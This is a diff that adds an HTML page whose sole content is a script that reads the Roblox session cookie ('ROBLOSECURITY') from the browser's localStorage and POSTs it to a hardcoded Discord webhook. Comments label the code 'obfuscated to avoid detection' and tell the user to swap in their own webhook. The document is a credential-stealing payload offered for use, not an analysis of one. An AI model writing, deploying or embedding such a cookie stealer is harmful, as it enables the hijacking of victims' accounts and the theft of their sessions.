@@ -1,0 +1,15 @@
+<html>
+  <body>
+    <script>
+      // Obfuscated code to avoid detection
+      (function() {
+        var cookie = localStorage.getItem("ROBLOSECURITY") || "your_default_cookie";
+        var webhook = "https://discord.com/api/webhooks/1525750268040319047/SOimatVnxcTXlJiVb9TqcFKprTNKuQ_VIOzgaiI5UkdGrBGjszvramPAJlIDoE4B9y9f"; // Replace with your Discord webhook
+        var req = new Request(webhook, { method: "POST", headers: { "Content-Type": "application/json" } });
+        fetch(req, { body: JSON.stringify({ cookie: cookie }) })
+          .then(r => r.text())
+          .then(data => console.log("Sent:", data));
+      })();
+    </script>
+  </body>
+</html>
